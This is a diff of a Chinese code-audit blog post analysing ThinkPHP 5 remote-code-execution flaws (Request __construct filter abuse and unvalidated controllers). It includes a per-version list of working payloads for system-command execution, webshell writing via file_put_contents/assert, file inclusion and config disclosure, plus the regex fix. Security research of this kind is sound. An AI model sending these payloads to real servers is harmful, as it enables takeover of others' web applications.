@@ -1,11 +1,11 @@
 ---
 title: "Thinkphp5 RCE总结"
 date: 2019-11-27T21:39:54+08:00
-lastmod: 2019-11-27T21:39:54+08:00
 draft: false
 tags: ['thinkphp','代码审计']
 categories: ['代码审计']
-comment: true
+series:
+- ThinkPHP
 ---
 
 thinkphp5 rce 分析总结
@@ -31,9 +31,9 @@ thinkphp5最出名的就是rce，我先总结rce，rce有两个大版本的分�
 ```
 5.0.x ：
 ```
-?s=index/think\config/get&name=database.username # 获取配置信息
-?s=index/\think\Lang/load&file=../../test.jpg    # 包含任意文件
-?s=index/\think\Config/load&file=../../t.php     # 包含任意.php文件
+?s=index/think\config/get&name=database.username // 获取配置信息
+?s=index/\think\Lang/load&file=../../test.jpg    // 包含任意文件
+?s=index/\think\Config/load&file=../../t.php     // 包含任意.php文件
 ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 ?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami
 ```
@@ -59,10 +59,10 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
 ```
 可以看到payload分为两种类型，一种是因为Request类的`method`和`__construct`方法造成的，另一种是因为Request类在兼容模式下获取的控制器没有进行合法校验，我们下面分两种来讲，然后会将thinkphp5的每个小版本都测试下找下可用的payload。
 
-# thinkphp5 method任意调用方法导致rce
+## thinkphp5 method任意调用方法导致rce
 php5.4.45+phpstudy+thinkphp5.0.5+phpstorm+xdebug
 
-# 创建项目
+## 创建项目
 ```
 composer create-project topthink/think=5.0.5 thinkphp5.0.5  --prefer-dist
 ```
@@ -74,7 +74,7 @@ composer create-project topthink/think=5.0.5 thinkphp5.0.5  --prefer-dist
 },
 ```
 然后运行`compsoer update`
-# 漏洞分析
+## 漏洞分析
 `thinkphp/library/think/Request.php:504` `Request`类的`method`方法
 
 ![image](https://y4er.com/img/uploads/20191127224395.jpg)
@@ -186,9 +186,9 @@ public static function run(Request $request = null)
 最后借用七月火师傅的一张流程图
 ![image](https://y4er.com/img/uploads/20191127228626.jpg)
 
-# method __contruct导致的rce 各版本payload
+## method __contruct导致的rce 各版本payload
 一个一个版本测试，测试选项有命令执行、写shell、debug选项
-## 5.0
+### 5.0
 debug 无关
 命令执行
 ```
@@ -202,7 +202,7 @@ _method=__construct&method=GET&filter[]=system&get[]=whoami
 POST
 s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
 ```
-## 5.0.1
+### 5.0.1
 debug 无关
 命令执行
 ```
@@ -216,7 +216,7 @@ _method=__construct&method=GET&filter[]=system&get[]=whoami
 POST
 s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
 ```
-## 5.0.2
+### 5.0.2
 debug 无关
 命令执行
 ```
@@ -230,7 +230,7 @@ _method=__construct&method=GET&filter[]=system&get[]=whoami
 POST
 s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
 ```
-## 5.0.3
+### 5.0.3
 debug 无关
 命令执行
 ```
@@ -244,7 +244,7 @@ _method=__construct&method=GET&filter[]=system&get[]=whoami
 POST
 s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
 ```
-## 5.0.4
+### 5.0.4
 debug 无关
 命令执行
 ```
@@ -258,7 +258,7 @@ _method=__construct&method=GET&filter[]=system&get[]=whoami
 POST
 s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
 ```
-## 5.0.5
+### 5.0.5
 debug 无关
 命令执行
 ```
@@ -272,7 +272,7 @@ _method=__construct&method=GET&filter[]=system&get[]=whoami
 POST
 s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
 ```
-## 5.0.6
+### 5.0.6
 debug 无关
 命令执行
 ```
@@ -286,7 +286,7 @@ _method=__construct&method=GET&filter[]=system&get[]=whoami
 POST
 s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
 ```
-## 5.0.7
+### 5.0.7
 debug 无关
 命令执行
 ```
@@ -300,22 +300,7 @@ _method=__construct&method=GET&filter[]=system&get[]=whoami
 POST
 s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
 ```
-## 5.0.8
-debug 无关
-命令执行
-```
-POST ?s=index/index
-s=whoami&_method=__construct&method=POST&filter[]=system
-aaaa=whoami&_method=__construct&method=GET&filter[]=system
-_method=__construct&method=GET&filter[]=system&get[]=whoami
-c=system&f=calc&_method=filter
-```
-写shell
-```
-POST
-s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
-```
-## 5.0.9
+### 5.0.8
 debug 无关
 命令执行
 ```
@@ -330,7 +315,22 @@ c=system&f=calc&_method=filter
 POST
 s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
 ```
-## 5.0.10
+### 5.0.9
+debug 无关
+命令执行
+```
+POST ?s=index/index
+s=whoami&_method=__construct&method=POST&filter[]=system
+aaaa=whoami&_method=__construct&method=GET&filter[]=system
+_method=__construct&method=GET&filter[]=system&get[]=whoami
+c=system&f=calc&_method=filter
+```
+写shell
+```
+POST
+s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
+```
+### 5.0.10
 从5.0.10开始默认debug=false，debug无关
 命令执行
 ```
@@ -345,7 +345,7 @@ c=system&f=calc&_method=filter
 POST
 s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
 ```
-## 5.0.11
+### 5.0.11
 默认debug=false，debug无关
 命令执行
 ```
@@ -360,7 +360,7 @@ c=system&f=calc&_method=filter
 POST
 s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
 ```
-## 5.0.12
+### 5.0.12
 默认debug=false，debug无关
 命令执行
 ```
@@ -375,7 +375,7 @@ c=system&f=calc&_method=filter
 POST
 s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
 ```
-## 5.0.13
+### 5.0.13
 默认debug=false，需要开启debug
 命令执行
 ```
@@ -391,7 +391,7 @@ POST
 s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
 ```
 
-# 版本和DEBUG选项的关系
+## 版本和DEBUG选项的关系
 5.0.13版本之后需要开启debug才能rce，为什么？比较一下5.0.13和5.0.5版本的代码
 
 https://github.com/top-think/framework/compare/v5.0.5...v5.0.13#diff-d86cf2606459bf4da21b7c3a1f7191f3
@@ -436,14 +436,14 @@ _method=__construct&filter[]=system&method=GET
 ```
 
 我们继续
-## 5.0.13补充
+### 5.0.13补充
 补充
 有captcha路由时无需debug=true
 ```
 POST ?s=captcha/calc
 _method=__construct&filter[]=system&method=GET
 ```
-## 5.0.14
+### 5.0.14
 默认debug=false，需要开启debug
 命令执行
 ```
@@ -463,7 +463,7 @@ s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=PO
 POST ?s=captcha/calc
 _method=__construct&filter[]=system&method=GET
 ```
-## 5.0.15
+### 5.0.15
 默认debug=false，需要开启debug
 命令执行
 ```
@@ -483,7 +483,7 @@ s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=PO
 POST ?s=captcha/calc
 _method=__construct&filter[]=system&method=GET
 ```
-## 5.0.16
+### 5.0.16
 默认debug=false，需要开启debug
 命令执行
 ```
@@ -503,7 +503,7 @@ s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=PO
 POST ?s=captcha/calc
 _method=__construct&filter[]=system&method=GET
 ```
-## 5.0.17
+### 5.0.17
 默认debug=false，需要开启debug
 命令执行
 ```
@@ -523,7 +523,7 @@ s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=PO
 POST ?s=captcha/calc
 _method=__construct&filter[]=system&method=GET
 ```
-## 5.0.18
+### 5.0.18
 默认debug=false，需要开启debug
 命令执行
 ```
@@ -543,7 +543,7 @@ s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=PO
 POST ?s=captcha/calc
 _method=__construct&filter[]=system&method=GET
 ```
-## 5.0.19
+### 5.0.19
 默认debug=false，需要开启debug
 命令执行
 ```
@@ -563,7 +563,7 @@ s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=PO
 POST ?s=captcha/calc
 _method=__construct&filter[]=system&method=GET
 ```
-## 5.0.20
+### 5.0.20
 默认debug=false，需要开启debug
 命令执行
 ```
@@ -583,7 +583,7 @@ s=file_put_contents('Y4er.php','<?php phpinfo();')&_method=__construct&method=PO
 POST ?s=captcha/calc
 _method=__construct&filter[]=system&method=GET
 ```
-## 5.0.21
+### 5.0.21
 默认debug=false，需要开启debug
 命令执行
 ```
@@ -603,7 +603,7 @@ POST ?s=captcha
 _method=__construct&filter[]=system&server[REQUEST_METHOD]=calc&method=get
 ```
 
-## 5.0.22
+### 5.0.22
 默认debug=false，需要开启debug
 命令执行
 ```
@@ -622,7 +622,7 @@ _method=__construct&filter[]=system&method=GET
 POST ?s=captcha
 _method=__construct&filter[]=system&server[REQUEST_METHOD]=calc&method=get
 ```
-## 5.0.23
+### 5.0.23
 默认debug=false，需要开启debug
 命令执行
 ```
@@ -641,9 +641,9 @@ _method=__construct&filter[]=system&method=GET
 POST ?s=captcha
 _method=__construct&filter[]=system&server[REQUEST_METHOD]=calc&method=get
 ```
-## 5.0.24
+### 5.0.24
 作为5.0.x的最后一个版本，rce被修复
-## 5.1.0
+### 5.1.0
 默认debug为true
 命令执行
 ```
@@ -663,7 +663,7 @@ _method=__construct&filter[]=system&method=GET
 POST ?s=captcha
 _method=__construct&filter[]=system&s=calc&method=get
 ```
-## 5.1.1
+### 5.1.1
 命令执行
 ```
 POST ?s=index/index
@@ -684,7 +684,7 @@ _method=__construct&filter[]=system&s=calc&method=get
 **至此，不再一个一个版本测了，费时费力。**
 基于`__construct`的payload大部分出现在5.0.x及低版本的5.1.x中。下文分析另一种rce。
 
-# 未开启强制路由导致rce
+## 未开启强制路由导致rce
 这种rce的payload多形如
 ```
 ?s=index/\think\Request/input&filter[]=system&data=pwd
@@ -693,7 +693,7 @@ _method=__construct&filter[]=system&s=calc&method=get
 ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 ```
-## 环境
+### 环境
 ```json
 "require": {
     "php": ">=5.6.0",
@@ -701,7 +701,7 @@ _method=__construct&filter[]=system&s=calc&method=get
     "topthink/think-captcha": "2.*"
 },
 ```
-## 分析
+### 分析
 ![image](https://y4er.com/img/uploads/20191127229702.jpg)
 thinkphp默认没有开启强制路由，而且默认开启路由兼容模式。那么我们可以用兼容模式来调用控制器，当没有对控制器过滤时，我们可以调用任意的方法来执行。上文提到所有用户参数都会经过 `Request` 类的 `input` 方法处理，该方法会调用 `filterValue` 方法，而 `filterValue` 方法中使用了 `call_user_func` ，那么我们就来尝试利用这个方法。访问
 
@@ -758,7 +758,7 @@ public function init()
 ![image](https://y4er.com/img/uploads/20191127221161.jpg)
 整个流程中没有对控制器进行合法校验，导致可以调用任意控制器，实现rce。
 
-## 修复
+### 修复
 ```
 // 获取控制器名
 $controller = strip_tags($result[1] ?: $config['default_controller']);
@@ -768,7 +768,7 @@ if (!preg_match('/^[A-Za-z](\w|\.)*$/', $controller)) {
 }
 ```
 大于5.0.23、大于5.1.30获取时使用正则匹配校验
-## payload
+### payload
 命令执行
 ```
 5.0.x
@@ -790,16 +790,16 @@ if (!preg_match('/^[A-Za-z](\w|\.)*$/', $controller)) {
 其他
 ```
 5.0.x
-?s=index/think\config/get&name=database.username # 获取配置信息
-?s=index/\think\Lang/load&file=../../test.jpg    # 包含任意文件
-?s=index/\think\Config/load&file=../../t.php     # 包含任意.php文件
+?s=index/think\config/get&name=database.username // 获取配置信息
+?s=index/\think\Lang/load&file=../../test.jpg    // 包含任意文件
+?s=index/\think\Config/load&file=../../t.php     // 包含任意.php文件
 ```
 如果你碰到了控制器不存在的情况，是因为在tp获取控制器时，`thinkphp/library/think/App.php:561`会把url转为小写，导致控制器加载失败。
 ![image](https://y4er.com/img/uploads/20191127221875.jpg)
-## 总结
+### 总结
 其实thinkphp的rce差不多都被拦截了，我们其实更需要将rce转化为其他姿势，比如文件包含去包含日志，或者转向反序列化。姿势太多，总结不过来，这篇文章就到这里把。
 
-# 参考
+## 参考
 - https://xz.aliyun.com/t/6106
 - https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html
 - https://github.com/Mochazz/ThinkPHP-Vuln
